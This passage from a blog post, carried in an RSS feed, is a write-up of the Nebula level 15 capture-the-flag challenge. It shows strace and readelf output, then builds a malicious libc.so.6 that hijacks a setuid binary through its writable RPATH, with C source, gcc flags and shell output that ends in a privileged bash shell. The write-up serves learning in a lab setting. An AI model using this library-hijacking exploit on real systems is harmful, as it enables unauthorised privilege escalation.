open(&amp;quot;/var/tmp/flag15/tls/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/sse2&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/tls/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/tls&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686/sse2/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686/sse2&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/i686/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/i686&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/sse2/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/sse2/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/sse2/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/sse2&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/cmov/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15/cmov&amp;quot;, 0xbf8c25d4) = -1 ENOENT (No such file or directory)
open(&amp;quot;/var/tmp/flag15/libc.so.6&amp;quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
stat64(&amp;quot;/var/tmp/flag15&amp;quot;, {st_mode=S_IFDIR|0775, st_size=3, ...}) = 0
open(&amp;quot;/etc/ld.so.cache&amp;quot;, O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb779e000
close(3)                                = 0
access(&amp;quot;/etc/ld.so.nohwcap&amp;quot;, F_OK)      = -1 ENOENT (No such file or directory)
open(&amp;quot;/lib/i386-linux-gnu/libc.so.6&amp;quot;, O_RDONLY) = 3
read(3, &amp;quot;\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0&amp;quot;..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x6ea000
mmap2(0x860000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0x860000
mmap2(0x863000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x863000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb779d000
set_thread_area({entry_number:-1 -&amp;gt; 6, base_addr:0xb779d8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0x860000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x57b000, 4096, PROT_READ)     = 0
munmap(0xb779e000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77a6000
write(1, &amp;quot;strace it!\n&amp;quot;, 11strace it!
)            = 11
exit_group(11)                          = ?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Some more information about the binary:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:~$ readelf -d /home/flag15/flag15 

Dynamic section at offset 0xf20 contains 21 entries:
  Tag        Type                         Name/Value
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 0x0000000c (INIT)                       0x80482c0
 0x0000000d (FINI)                       0x80484ac
 0x6ffffef5 (GNU_HASH)                   0x80481ac
 0x00000005 (STRTAB)                     0x804821c
 0x00000006 (SYMTAB)                     0x80481cc
 0x0000000a (STRSZ)                      90 (bytes)
 0x0000000b (SYMENT)                     16 (bytes)
 0x00000015 (DEBUG)                      0x0
 0x00000003 (PLTGOT)                     0x8049ff4
 0x00000002 (PLTRELSZ)                   24 (bytes)
 0x00000014 (PLTREL)                     REL
 0x00000017 (JMPREL)                     0x80482a8
 0x00000011 (REL)                        0x80482a0
 0x00000012 (RELSZ)                      8 (bytes)
 0x00000013 (RELENT)                     8 (bytes)
 0x6ffffffe (VERNEED)                    0x8048280
 0x6fffffff (VERNEEDNUM)                 1
 0x6ffffff0 (VERSYM)                     0x8048276
 0x00000000 (NULL)                       0x0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So puting it all together - it looks like the binary is trying to load the &lt;em&gt;libc.so.6&lt;/em&gt; library from &lt;em&gt;RPATH&lt;/em&gt;, which is &lt;em&gt;/var/tmp/flag15&lt;/em&gt;. Since we can write there - we can place a malicious &lt;em&gt;libc.so.6&lt;/em&gt; file
and wait for the binary to load it.&lt;/p&gt;

&lt;p&gt;The &lt;em&gt;flag15&lt;/em&gt; binary has a few functions that we can work with:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:/var/tmp/flag15$ objdump -R /home/flag15/flag15 

/home/flag15/flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;__libc_start_main&lt;/code&gt; seems like the best candidate since it is executed upon loading the shared library.
A simple library code to try to execute bash:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    system(&amp;quot;/bin/bash&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However, the library does not work:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:/var/tmp/flag15$ gcc -shared -fPIC -o libc.so.6 lib.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
level15@nebula:/var/tmp/flag15$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Some Googling shows that the &amp;ldquo;version&amp;rdquo; error can be solved by linking with a &lt;code&gt;version-script&lt;/code&gt; (older glibc):&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:/var/tmp/flag15$ cat version.txt 
GLIBC_2.0 {
};
level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -Wl,--version-script=version.txt -o libc.so.6 lib.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: version `GLIBC_2.1.3&#39; not found (required by /var/tmp/flag15/libc.so.6)
level15@nebula:/var/tmp/flag15$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now another error, which can be solved by static linking options &lt;code&gt;-Bstatic&lt;/code&gt; and &lt;code&gt;-static-libgcc&lt;/code&gt;.
After adding those - the exploit works, but it seems that our user id is wrong:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -static-libgcc -Wl,--version-script=version.txt,-Bstatic -o libc.so.6 lib.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
bash-4.2$ getflag
getflag is executing on a non-flag account, this doesn&#39;t count
bash-4.2$ id
uid=1016(level15) gid=1016(level15) groups=1016(level15)
bash-4.2$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We need to reset the efective user id to the real one with &lt;code&gt;setresuid()&lt;/code&gt; and capture the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level15@nebula:/var/tmp/flag15$ cat lib.c 
#include &amp;lt;stdio.h&amp;gt;

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    setresuid(geteuid(),geteuid(),geteuid());
    system(&amp;quot;/bin/bash&amp;quot;);
}
level15@nebula:/var/tmp/flag15$ gcc -fPIC -shared -static-libgcc -Wl,--version-script=version.txt,-Bstatic -o libc.so.6 lib.c
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15 
flag15@nebula:/var/tmp/flag15$ id
uid=984(flag15) gid=1016(level15) groups=984(flag15),1016(level15)
flag15@nebula:/var/tmp/flag15$ getflag 
You have successfully executed getflag on a target account
flag15@nebula:/var/tmp/flag15$ 
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
  </channel>
</rss>